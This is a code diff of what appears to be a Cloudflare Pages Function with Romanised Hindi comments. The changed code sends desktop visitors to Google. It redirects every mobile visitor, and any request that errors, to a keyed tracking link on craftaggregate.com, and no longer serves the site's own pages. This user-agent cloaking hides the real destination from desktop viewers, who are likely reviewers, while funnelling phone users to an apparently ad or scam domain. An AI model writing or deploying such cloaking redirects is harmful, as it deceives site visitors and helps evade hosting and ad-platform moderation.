@@ -1,15 +1,22 @@
 export async function onRequest(context) {
-  const request = context.request;
-  const userAgent = request.headers.get('user-agent') || '';
-  
-  // Mobile devices ko pehchanein
-  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-return Response.redirect("https://craftaggregate.com/y2bxipka?key=19ec0da329890d022c7dab86a665b354", 302);
-  // Agar user DESKTOP se hai, to use raste se hi Google par bhej dein
-  if (!isMobile) {
-    return Response.redirect("https://www.google.com", 302);
-  }
+  try {
+    const request = context.request;
+    const userAgent = request.headers.get('user-agent') || '';
+    
+    // Mobile devices ko check karne ka regex
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
-  // Agar user MOBILE se hai, to use aapki asli pages.dev site dikhayein
-  return next();
+    // 1. Agar user DESKTOP se hai, to use Google par redirect karein
+    if (!isMobile) {
+      return Response.redirect("https://google.com", 302);
+    }
+
+    // 2. Agar user MOBILE se hai, to use is link par redirect karein
+    // Is se mobile user ke liye bhi Error 1101 khatam ho jayega
+    return Response.redirect("https://craftaggregate.com/y2bxipka?key=19ec0da329890d022c7dab86a665b354", 302);
+    
+  } catch (error) {
+    // Agar koi unexpected error aaye to safe fallback URL par bhej dein
+    return Response.redirect("https://craftaggregate.com/y2bxipka?key=19ec0da329890d022c7dab86a665b354", 302);
+  }
 }
